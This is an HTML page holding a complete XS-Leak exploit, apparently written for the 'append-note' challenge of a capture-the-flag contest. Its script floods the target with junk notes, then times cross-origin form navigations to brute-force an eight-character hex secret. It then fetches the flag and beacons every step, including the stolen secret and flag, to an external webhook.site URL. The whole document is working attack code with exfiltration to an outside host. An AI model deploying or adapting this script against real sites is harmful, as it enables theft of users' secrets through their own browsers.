<!DOCTYPE html>
<html>
<head><title>XS-Leak Final</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-7wwed.instancer.lac.tf";
var WEBHOOK = "https://webhook.site/9aac3658-ff0f-45b5-b8ae-6f7d8d3c0eee";
var CHARS = "0123456789abcdef";

function report(msg) {
    navigator.sendBeacon(WEBHOOK, msg);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
}

report("LOAD");

// Navigate via form and measure time
function navigate(content) {
    return new Promise(function(resolve) {
        var url = TARGET + "/append?content=" + encodeURIComponent(content) + "&url=" + encodeURIComponent(TARGET + "/");
        var wname = "w" + Math.random().toString(36).slice(2);
        
        var form = document.createElement("form");
        form.method = "GET";
        form.action = url;
        form.target = wname;
        document.body.appendChild(form);
        
        var t0 = performance.now();
        form.submit();
        document.body.removeChild(form);
        
        setTimeout(function() {
            var elapsed = performance.now() - t0;
            try { window.open("", wname).close(); } catch(e) {}
            resolve(elapsed);
        }, 200);
    });
}

async function main() {
    report("START");
    document.getElementById("s").textContent = "Polluting...";
    
    try {
        // Step 1: Pollute notes with garbage to amplify timing difference
        // Use strings that won't match any hex prefix (start with Z)
        for (var i = 0; i < 50; i++) {
            await navigate("ZZZZ" + i);
        }
        report("POLLUTED");
        
        // Step 2: Now do timing attack - 200 will short-circuit on SECRET, 404 must check all 101 notes
        var secret = "";
        
        for (var pos = 0; pos < 8; pos++) {
            document.getElementById("s").textContent = "P" + pos;
            
            var results = [];
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                var time = await navigate(secret + c);
                results.push({ c: c, time: time });
            }
            
            results.sort(function(a, b) { return a.time - b.time; });
            
            var fast = results[0];
            var slow = results[results.length - 1];
            
            report("P" + pos + ":F=" + fast.c + "(" + Math.round(fast.time) + ")S=" + slow.c + "(" + Math.round(slow.time) + ")");
            
            // Correct char should be FASTEST (200 short-circuits on first note = SECRET)
            secret += fast.c;
        }
        
        report("SECRET=" + secret);
        
        var resp = await fetch(TARGET + "/flag?secret=" + secret);
        var flag = await resp.text();
        report("FLAG=" + flag);
        
        document.getElementById("s").textContent = flag;
        
    } catch(e) {
        report("ERR=" + e.message);
    }
}

main();
</script>
</body>
</html>
